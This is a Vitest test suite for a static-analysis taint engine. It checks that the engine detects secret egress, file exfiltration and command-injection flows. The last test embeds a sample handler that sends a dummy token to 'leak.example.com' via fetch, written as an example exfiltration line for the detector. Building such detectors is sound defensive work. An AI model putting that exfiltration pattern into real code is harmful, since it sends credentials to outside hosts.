/**
 * P16 — Dataflow & Taint Intelligence Test Suite
 */

import { describe, it, expect } from 'vitest';
import { 
  TaintSourceRegistry,
  TaintSinkRegistry,
  TaintSanitizerRegistry,
  DataflowTaintEngine,
  TAINT_FIXTURE_SCENARIOS,
  StaticAnalysisEngine
} from '../../workers/static-analysis/index.ts';

describe('P16 — Dataflow / Taint Intelligence Architecture', () => {
  describe('Registries & Versioning', () => {
    it('provides versioned source, sink, and sanitizer registries', () => {
      expect(TaintSourceRegistry.REGISTRY_VERSION).toBe('1.0.0');
      expect(TaintSinkRegistry.REGISTRY_VERSION).toBe('1.0.0');
      expect(TaintSanitizerRegistry.REGISTRY_VERSION).toBe('1.0.0');

      const sources = TaintSourceRegistry.getAllSources();
      const sinks = TaintSinkRegistry.getAllSinks();
      const sanitizers = TaintSanitizerRegistry.getAllSanitizers();

      expect(sources.length).toBeGreaterThanOrEqual(7);
      expect(sinks.length).toBeGreaterThanOrEqual(6);
      expect(sanitizers.length).toBeGreaterThanOrEqual(5);

      // Verify category coverage in registries
      expect(sources.some(s => s.category === 'CREDENTIAL_SECRET')).toBe(true);
      expect(sources.some(s => s.category === 'ENVIRONMENT_SECRET')).toBe(true);
      expect(sources.some(s => s.category === 'FILESYSTEM_READ')).toBe(true);
      expect(sources.some(s => s.category === 'USER_INPUT')).toBe(true);

      expect(sinks.some(s => s.category === 'NETWORK_EGRESS')).toBe(true);
      expect(sinks.some(s => s.category === 'PROCESS_EXECUTION')).toBe(true);
      expect(sinks.some(s => s.category === 'FILESYSTEM_WRITE')).toBe(true);
      expect(sinks.some(s => s.category === 'TOOL_INVOCATION')).toBe(true);

      expect(sanitizers.some(s => s.category === 'CRYPTOGRAPHIC_HASH')).toBe(true);
      expect(sanitizers.some(s => s.category === 'REDACTION_MASK')).toBe(true);
    });
  });

  describe('Golden Fixture Scenarios & Flow Tracking', () => {
    it('traces positive intra-function credential -> network flow with high confidence', () => {
      const scenario = TAINT_FIXTURE_SCENARIOS.credential_to_network;
      expect(scenario).toBeDefined();

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_taint_test_001',
        files: scenario.files,
      });

      expect(report.taint_report).toBeDefined();
      const taint = report.taint_report!;

      expect(taint.paths.length).toBeGreaterThanOrEqual(1);
      const activePath = taint.paths.find(p => p.status === 'ACTIVE');
      expect(activePath).toBeDefined();
      expect(activePath!.flow_classification).toBe('POTENTIAL_SECRET_EGRESS');
      expect(activePath!.source.category).toBe('ENVIRONMENT_SECRET');
      expect(activePath!.sink.category).toBe('NETWORK_EGRESS');
      expect(activePath!.confidence).toBeGreaterThanOrEqual(0.9);
      expect(activePath!.hops.length).toBeGreaterThanOrEqual(2);

      // Epistemic invariant: Flow is marked INFERRED_TAINT_FLOW
      expect(activePath!.epistemic_label).toBe('INFERRED_TAINT_FLOW');
      expect(activePath!.evidence.epistemic_state).toBe('DERIVED_ASSERTION');
    });

    it('correctly marks cryptographic hash/sanitized flow as SANITIZED with neutralization power', () => {
      const scenario = TAINT_FIXTURE_SCENARIOS.sanitized_path;
      expect(scenario).toBeDefined();

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_taint_test_002',
        files: scenario.files,
      });

      const taint = report.taint_report!;
      expect(taint.summary.sanitized_paths).toBeGreaterThanOrEqual(1);

      const sanitizedPath = taint.paths.find(p => p.status === 'SANITIZED');
      expect(sanitizedPath).toBeDefined();
      expect(sanitizedPath!.sanitizer).toBeDefined();
      expect(sanitizedPath!.sanitizer!.neutralization_power).toBe(1.0);
      expect(sanitizedPath!.sanitizer!.category).toBe('CRYPTOGRAPHIC_HASH');
      expect(sanitizedPath!.evidence.epistemic_state).toBe('DERIVED_ASSERTION');
    });

    it('detects unreachable / dead code branch flows and labels them UNREACHABLE', () => {
      const scenario = TAINT_FIXTURE_SCENARIOS.unreachable_path;
      expect(scenario).toBeDefined();

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_taint_test_003',
        files: scenario.files,
      });

      const taint = report.taint_report!;
      expect(taint.summary.unreachable_paths).toBeGreaterThanOrEqual(1);

      const unreachablePath = taint.paths.find(p => p.status === 'UNREACHABLE');
      expect(unreachablePath).toBeDefined();
    });

    it('flags dynamic dispatch paths as INDETERMINATE when callee cannot be statically bound', () => {
      const scenario = TAINT_FIXTURE_SCENARIOS.dynamic_dispatch;
      expect(scenario).toBeDefined();

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_taint_test_004',
        files: scenario.files,
      });

      const taint = report.taint_report!;
      expect(taint.summary.indeterminate_paths).toBeGreaterThanOrEqual(1);

      const indetPath = taint.paths.find(p => p.status === 'INDETERMINATE');
      expect(indetPath).toBeDefined();
      expect(indetPath!.hops.some(h => h.is_dynamic)).toBe(true);
    });

    it('traces cross-file file-read -> network-post exfiltration flow (file_to_network)', () => {
      const scenario = TAINT_FIXTURE_SCENARIOS.file_to_network;
      expect(scenario).toBeDefined();

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_taint_test_005',
        files: scenario.files,
      });

      const taint = report.taint_report!;
      const activePath = taint.paths.find(p => p.status === 'ACTIVE' && p.flow_classification === 'POTENTIAL_FILE_EXFILTRATION');
      expect(activePath).toBeDefined();
      expect(activePath!.source.category).toBe('FILESYSTEM_READ');
      expect(activePath!.sink.category).toBe('NETWORK_EGRESS');
    });

    it('traces cross-file credential -> network egress flow (cross_file_flow)', () => {
      const scenario = TAINT_FIXTURE_SCENARIOS.cross_file_flow;
      expect(scenario).toBeDefined();

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_taint_test_006',
        files: scenario.files,
      });

      const taint = report.taint_report!;
      const activePath = taint.paths.find(p => p.status === 'ACTIVE' && p.flow_classification === 'POTENTIAL_SECRET_EGRESS');
      expect(activePath).toBeDefined();
      expect(activePath!.is_cross_file).toBe(true);
      expect(activePath!.source.category).toBe('ENVIRONMENT_SECRET');
    });

    it('traces user prompt -> process argument command injection flow (process_argument_flow)', () => {
      const scenario = TAINT_FIXTURE_SCENARIOS.process_argument_flow;
      expect(scenario).toBeDefined();

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_taint_test_007',
        files: scenario.files,
      });

      const taint = report.taint_report!;
      const activePath = taint.paths.find(p => p.status === 'ACTIVE' && p.flow_classification === 'POTENTIAL_COMMAND_INJECTION');
      expect(activePath).toBeDefined();
      expect(activePath!.source.category).toBe('USER_INPUT');
      expect(activePath!.sink.category).toBe('PROCESS_EXECUTION');
    });
  });

  describe('Taint Path Confidence & Lineage Derivation', () => {
    it('produces valid LineageEvidence and SourceSpans for each taint step', () => {
      const code = `
        export function handler() {
          const secretKey = "ghp_123456789012345678901234567890123456";
          const payload = \`token=\${secretKey}\`;
          fetch("https://leak.example.com", { body: payload });
        }
      `;

      const report = StaticAnalysisEngine.analyze({
        artifactId: 'art_span_test',
        files: [{ path: 'src/handler.ts', content: code }],
      });

      const taint = report.taint_report!;
      expect(taint.paths.length).toBeGreaterThan(0);
      const path = taint.paths[0];

      expect(path.evidence.evidence_id).toBeDefined();
      expect(path.evidence.source_span).toBeDefined();
      expect(path.evidence.sink_span).toBeDefined();
      expect(path.source.span.start_line).toBe(3);
      expect(path.sink.span.start_line).toBe(5);

      // Check version and summary attachment
      expect(taint.engine_version).toBe('1.0.0');
      expect(taint.ruleset_version).toBe('1.0.0');
      expect(taint.summary.total_paths_identified).toBeGreaterThan(0);
    });
  });
});
